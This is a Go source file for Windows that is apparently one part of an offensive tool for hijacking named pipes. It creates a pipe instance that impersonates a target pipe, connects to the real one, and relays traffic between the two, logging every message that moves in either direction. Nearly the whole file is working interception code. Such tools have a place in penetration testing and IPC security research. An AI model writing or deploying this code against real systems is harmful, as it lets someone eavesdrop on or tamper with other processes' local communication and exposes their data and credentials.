package main

import (
	"bufio"
	"fmt"
	"net"
	"time"
	"unsafe"

	"github.com/Microsoft/go-winio"
	"golang.org/x/sys/windows"
)

//var readFromCliChannels = make(map[windows.Handle]chan string)
//var clientMutex sync.Mutex

//////////////////////////////////////////////////

func writeToNP(conn net.Conn, data []byte, toNP chan bool) {
	writer := bufio.NewWriter(conn)
	writer.Write(data)
	writer.Flush()
	toNP <- true
}

func readFromNP(conn net.Conn, fromNP chan []byte) {
	for {
		dataLen, data, err := readFromConn(conn)
		if err != nil {
			conn.Close()
			var empty []byte
			fromNP <- empty
			return
		}
		if dataLen > 0 {
			fromNP <- data
			return
		}
		time.Sleep(300 * time.Millisecond)
	}
}

func writeToCli(handle windows.Handle, data []byte, toCli chan bool) {
	var overlapped windows.Overlapped
	overlapped.HEvent, _ = windows.CreateEvent(nil, 1, 0, nil)
	defer windows.CloseHandle(overlapped.HEvent)

	ret, _, _ := procWriteFileEx.Call(
		uintptr(handle),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&overlapped)),
		windows.NewCallback(func(errCode uint32, numBytes uint32, lpOverlapped *windows.Overlapped) uintptr {
			// fmt.Println("Bytes Written:", numBytes)
			return 0
		}),
	)
	if ret == 0 {
		// fmt.Println("Error calling WriteFileEx:", err)
		toCli <- false
		return
	}

	// Wait for the overlapped operation to complete
	// procWaitForSingleObject.Call(uintptr(overlapped.HEvent), windows.INFINITE)
	windows.SleepEx(windows.INFINITE, true)

	toCli <- true
}

func readFromCli(handle windows.Handle, fromCli chan []byte) {
	for {
		var overlapped windows.Overlapped
		overlapped.HEvent, _ = windows.CreateEvent(nil, 1, 0, nil)
		defer windows.CloseHandle(overlapped.HEvent)

		// Buffer to read data into
		buffer := make([]byte, 1024)

		// Call ReadFileEx
		var bytesRead uint32
		ret, _, _ := procReadFileEx.Call(
			uintptr(handle),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(len(buffer)),
			uintptr(unsafe.Pointer(&overlapped)),
			windows.NewCallback(func(errCode uint32, numBytes uint32, lpOverlapped *windows.Overlapped) uintptr {
				bytesRead = numBytes
				return 0
			}),
		)
		if ret == 0 {
			var empty []byte
			fromCli <- empty
			// fmt.Println("Error calling ReadFileEx:", err)
			return
		}

		// Wait for the overlapped operation to complete
		// procWaitForSingleObject.Call(uintptr(overlapped.HEvent), windows.INFINITE)
		windows.SleepEx(windows.INFINITE, true)

		data := buffer[:bytesRead]
		if len(data) > 0 {
			fromCli <- data
			return
		}
		time.Sleep(300 * time.Millisecond)
	}
}

func handleClientHJ(conn net.Conn, handle windows.Handle, pipeName string, sessionID int) {
	defer conn.Close()
	defer windows.CloseHandle(handle)

	defer fmt.Printf("⚡ %s    ❌ [%03d] End client for %s\n", timeFormat(time.Now()), sessionID, pipeName)
	defer time.Sleep(500 * time.Millisecond)

	fmt.Printf("⚡ %s    ⚪ [%03d] Hijacking new client for %s\n", timeFormat(time.Now()), sessionID, pipeName)

	// channels
	fromNP := make(chan []byte)
	fromCli := make(chan []byte)
	toNP := make(chan bool)
	toCli := make(chan bool)

	go readFromNP(conn, fromNP)
	go readFromCli(handle, fromCli)

	for {
		select {
		case success := <-toNP:
			if success {
				// fmt.Printf("⚡ %s    ⚡ [%03d] Flushed to %s\n", timeFormat(time.Now()), sessionID, pipeName)
			} else {
				return
			}

		case success := <-toCli:
			if success {
				// fmt.Printf("⚡ %s    ⚡ [%03d] Flushed to %s\n", timeFormat(time.Now()), sessionID, pipeName)
			} else {
				return
			}

		case data := <-fromNP:
			// Print received data from NP
			dataLen := len(data)
			if dataLen > 0 {
				fmt.Printf("⚡ %s    ⚡ [%03d] %dB FROM %s: %q\n", timeFormat(time.Now()), sessionID, dataLen, pipeName, data)
			} else {
				return
			}

			// Send data to Client
			toCli = make(chan bool)
			go writeToCli(handle, data, toCli)

			// Read again from NP
			fromNP = make(chan []byte)
			go readFromNP(conn, fromNP)

		case data := <-fromCli:
			// Print received data from Client
			dataLen := len(data)
			if dataLen > 0 {
				fmt.Printf("⚡ %s    ⚡ [%03d] %dB TO %s: %q\n", timeFormat(time.Now()), sessionID, dataLen, pipeName, data)
			} else {
				return
			}

			// Send data to NP
			toNP = make(chan bool)
			go writeToNP(conn, data, toNP)

			// Read again from Client
			fromCli = make(chan []byte)
			go readFromCli(handle, fromCli)
		}
	}
}

func startServerHJ(pipeName string) {
	sessionID := 0
	for {
		var err error
		var conn net.Conn
		var handle windows.Handle

		// Wait for targeted NP to start
		time.Sleep(100 * time.Millisecond)

		// Create our Pipe
		handle, err = createDuplexPipe(pipeName)
		if err != nil {
			return
		}

		// Connect to targeted NP
		conn, err = winio.DialPipe(pipeName, nil)
		if err != nil {
			fmt.Printf("⚡ %s    🔴 [%03d] Can't connect to %s \n", timeFormat(time.Now()), sessionID, pipeName)
			break
		}
		fmt.Printf("⚡ %s    ⚪ [%03d] Connected to %s \n", timeFormat(time.Now()), sessionID, pipeName)

		// Listen for client
		err = windows.ConnectNamedPipe(handle, nil)
		if err != nil {
			switch err {
			case windows.ERROR_PIPE_CONNECTED:
				//
			default:
				fmt.Printf("⚡ %s    🔴 [%03d] Client connect error for %s (%v)\n", timeFormat(time.Now()), sessionID, pipeName, err)
				windows.CloseHandle(handle)
				return
			}
			break
		}

		// Handle client
		go handleClientHJ(conn, handle, pipeName, sessionID)
		sessionID++
	}
}
